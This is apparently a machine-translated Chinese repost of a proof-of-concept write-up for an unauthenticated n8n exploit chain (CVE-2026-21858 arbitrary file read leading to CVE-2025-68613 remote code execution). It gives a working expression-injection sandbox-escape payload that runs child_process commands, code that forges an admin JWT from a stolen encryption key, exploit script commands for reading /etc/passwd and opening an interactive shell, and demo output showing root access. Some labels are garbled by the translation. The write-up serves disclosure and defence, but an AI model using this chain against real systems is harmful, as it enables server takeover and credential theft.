---
title: n8n Ni8mare - 未经认证的任意文件读取到远程代码执行链 (CVSS 10.0)
url: https://mp.weixin.qq.com/s/Np_-ztLJOq__mGmJjygvRA
source: Doonsec's feed
date: 2026-01-08
fetch_date: 2026-01-09T03:27:41.648226
---

# n8n Ni8mare - 未经认证的任意文件读取到远程代码执行链 (CVSS 10.0)

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeLiaWUqiaMTaTDExNN8CosK6aojdYaJypUoCWISSs7xseCxnNTVcQxFLuC435Rj8SLziaNGxSz6l7XA/0?wx_fmt=jpeg)

# n8n Ni8mare - 未经认证的任意文件读取到远程代码执行链 (CVSS 10.0)

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

CVE-2026-21858 + CVE-2025-68613 - n8n 全链

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeLiaWUqiaMTaTDExNN8CosK6WIoibMmeEYiaGM9ziaGgR2MVMO9dx62YcmhHRNHFwibmZy2rQJhaUIgibrg/640?wx_fmt=jpeg&from=appmsg)

未经身份验证的任意文件读取 → 管理员令牌伪造 → 沙箱绕过 → 远程代码执行

|  |  |
| --- | --- |
| **CVE** | CVE-2026-21858 (AFR) + CVE-2025-68613 (RCE) |
| **CVSS** | 10.0 + 9.9（临界值） |
| **做作的** | <= 1.65.0 (AFR) / >= 0.211.0 (RCE) |
| **固定的** | 1.121.0 (AFR) / 1.120.4+ (RCE) |
| **已披露** | 2026年1月7日 11:09 UTC |
| **代号** | Ni8mare |
| **信用** | 多尔·阿提亚斯（Cyera） |
| **开发** | 巧克力 |
| **过程** | AI自动化流程：补丁差异分析 → 复现 → 实验室 → 利用（披露后约9小时） |
| **类型** | 概念验证 - 并非通用漏洞利用程序（需要特定的工作流程配置，请参阅“限制”部分） |

n8n 上的完整未经认证的远程代码执行链：

* CVE-2026-21858 - 内容类型混淆 → 任意文件读取
* 读取配置 + 数据库 → Forge 管理员 JWT
* CVE-2025-68613 - 表达式注入 → 沙箱绕过 → 远程代码执行

为什么要利用这个漏洞？

此漏洞利用程序的开发独立于Cyera 的文档（在 Cyera 的文档完成后才被发现）。主要区别：

|  | Cyera（原创研究） | 此漏洞 |
| --- | --- | --- |
| **文件读取** | 加载到人工智能知识库 → 通过聊天查询 | 直接 HTTP 响应 |
| **先决条件** | 聊天工作流程 + AI 集成 | **任何包含文件上传的表单** |
| **RCE 方法** | “执行命令”节点（默认禁用） | **表达式注入（适用于默认安装）** |
| **自动化** | 手动/概念演示 | **全自动 Python 脚本** |

攻击链

```
┌───────────────────────────────────────────────────────────┐
│ UNAUTHENTICATED │
├───────────────────────────────────────────────────────────┤
│ 1. Read /proc/self/environ → Find HOME directory │
│ 2. Read $HOME/.n8n/config → Get encryptionKey │
│ 3. Read $HOME/.n8n/database.sqlite → Get admin creds │
├───────────────────────────────────────────────────────────┤
│ TOKEN FORGE │
├───────────────────────────────────────────────────────────┤
│ 4. Derive JWT secret from encryptionKey │
│ 5. Forge admin session cookie │
├───────────────────────────────────────────────────────────┤
│ AUTHENTICATED RCE │
├───────────────────────────────────────────────────────────┤
│ 6. Create workflow with expression injection │
│ 7. Sandbox bypass via this.process.mainModule.require    │
│ 8. Execute arbitrary commands │
└───────────────────────────────────────────────────────────┘
```

CVE-2026-21858 - 通过内容类型混淆进行任意文件读取

补丁

```
commit c8d604d2c466dd84ec24f4f092183d86e43f2518
Author: mfsiega
Date: Thu Nov 1311:51:402025 +0100

    Mergecommitfrom fork
```

传奇的“合并来自分支的提交” ——看到这个，说明有人发现了什么劲爆的东西。🌶️

根本原因

```
// BEFORE (vulnerable)
const files = (context.getBodyData().files as IDataObject) ?? {};
await context.nodeHelpers.copyBinaryFile(file.filepath, ...)

// AFTER (fixed)
a.ok(req.contentType === 'multipart/form-data', 'Expected multipart/form-data');
```

发送Content-Type: application/json→控制filepath→读取任意文件。

CVE-2025-68613 - 表达式注入远程代码执行漏洞

为什么要走这条绕道程序？

vm2n8n 沙箱使用/ 封装用户代码（代码节点、表达式）isolated-vm。其他远程代码执行 (RCE) 向量：

| 技术 | 地位 |
| --- | --- |
| 执行命令节点 | 默认禁用（`N8N_ALLOW_EXEC_COMMAND=false`） |
| SSH/HTTP 节点 | 在远程服务器上执行，而不是在 n8n 主机上执行。 |
| Pyodide 沙盒逃生 | CVE-2025-68668 - 需要 Python 代码节点 |
| **表达注射** | **CVE-2025-68613 - 在默认安装中有效** |

我使用表达式注入是因为它适用于任何默认设置的 n8n 实例——无需特殊节点或配置。Pyodide 绕过方法 (CVE-2025-68668) 需要 Python 代码节点，而该节点可能并非所有实例都可用。

有效载荷

```
={{ (function(){
  varrequire = this.process.mainModule.require;
  var execSync = require("child_process").execSync;
  return execSync("id").toString();
})() }}
```

n8n 表达式可以访问this.process.mainModule.require→ 完全沙盒逃逸。

Token Forge

```
# JWT secret derivation
jwt_secret = sha256(encryption_key[::2]).hexdigest()

# JWT hash
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]

# Forge token
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

实验室设置

```
docker compose up -d
# Wait ~60 seconds for setup
# Form: http://localhost:5678/form/vulnerable-form
# Creds: admin@exploit.local / password
```

用法

```
# Read arbitrary file
uv run python exploit.py http://localhost:5678 /form/vulnerable-form --read /etc/passwd

# Full chain with command
uv run python exploit.py http://localhost:5678 /form/vulnerable-form --cmd "id"

# Interactive shell
uv run python exploit.py http://localhost:5678 /form/vulnerable-form
```

演示

```
╔═══════════════════════════════════════════════════════════════╗
║ CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain ║
║ Arbitrary File Read → Token Forge → Sandbox Bypass → RCE ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: http://localhost:5678/form/vulnerable-form
[*] Version: 1.65.0 (VULN)
[x] HOME directory
[+] HOME directory: /root
[x] Encryption key
[+] Encryption key: yusrXZV1...
[x] Database
[+] Database: 1327104 bytes
[x] Admin user
[+] Admin user: admin@exploit.local
[x] Token forge
[+] Token forge: OK
[x] Admin access
[+] Admin access: GRANTED!
[+] Cookie: n8n-auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjljMWI5MzU0LTI5NzQtNGZlOS05OTc2LWVmZDM3ZWEyNWFlMiIsImhhc2giOiJGYzVQZjVkUDRxIn0.TrIjHV3_6pw6Syi4qme5larZeQElBJmo4Y_eSgL9_M0
[x] RCE
[+] RCE: OK

uid=0(root) gid=0(root) groups=0(root)
```

局限性

这并非“轻松攻破任何网络”的漏洞利用程序。它需要特定条件才能生效：

| 要求 | 描述 |
| --- | --- |
| **包含文件上传的表单** | Target 必须具有包含文件上传字段的表单工作流程 |
| **响应 Webhook 节点** | 工作流必须通过 HTTP 响应返回文件内容。 |
| **工作流已激活** | 必须激活表单工作流程。 |
| **未经身份验证的访问** | 表格必须公开可访问（无需身份验证） |

易受攻击的工作流配置示例：

```
{
  "nodes": [
    {
      "name": "Form Trigger",
      "type": "n8n-nodes-base.formTrigger",
      "parameters": {
        "responseMode": "responseNode",
        "formFields": {
          "values": [{ "fieldLabel": "document", "fieldType": "file" }]
        }
      }
    },
    {
      "name": "Respond",
      "type": "n8n-nodes-base.respondToWebhook",
      "parameters": {
        "respondWith": "binary",
        "inputDataFieldName": "document"
      }
    }
  ],
"connections": {
    "Form Trigger": { "main": [[{ "node": "Respond" }]] }
  }
}
```

关键要素是：fieldType: "file"+ respondWith: "binary"。这种模式在文件处理工作流程（转换器、图像调整器、文档处理器）中很常见。

作品：

* 返回二进制数据的响应节点表单（文件转换器、处理器）
* 默认 n8n 安装（表达式注入未被阻止）
* 本地/Docker部署（数据库+配置存储在磁盘上）

行不通：

* 没有响应节点的表单（文件已被读取，但HTTP响应中未返回内容）
* 需要身份验证的表单
* n8n 云（架构不同，无法访问本地文件）
* 已打补丁的版本（>= 1.121.0）

* 注意：无论采用何种数据泄露方法，都会触发此漏洞（任意文件读取）。响应节点只是检索内容的一种方式。根据工作流配置，其他方法（例如开箱即用或其他输出节点）也可能有效。
* 盲攻击：如果不存在响应节点，n8n 仍然可以读取文件，但无法通过 HTTP 响应提取数据。需要采用其他技术（例如带外攻击、时序攻击）。

参考

Cyera Research - Ni8mare完整报告- Dor Attias原创研究

* https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858

GHSA-v4pr-fm98-w9pg - CVE-2026-21858

* https://github.com/n8n-io/n8n/security/advisories/GHSA-v4pr-fm98-w9pg

GHSA-v98v-ff95-f3cp - CVE-2025-68613

* https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp

Nuclei Template CVE-2025-68613

* https://github.com/MuhamadJuwandi/nuclei-templates/blob/main/http/cves/2025/CVE-2025-68613.yaml

Formidable——“指的是图书馆，而不是那首歌”（感谢Cyera带来的笑声）

* https://github.com/node-formidable/formidable

项目地址：

https://github.com/Chocapikk/CVE-2026-21858

**END**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeLiaWUqiaMTaTDExNN8CosK61qgkvcM4A0gsdRCyfertojVV63D3ewDKDf0o9qhr1eL5TYia97OsIcQ/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过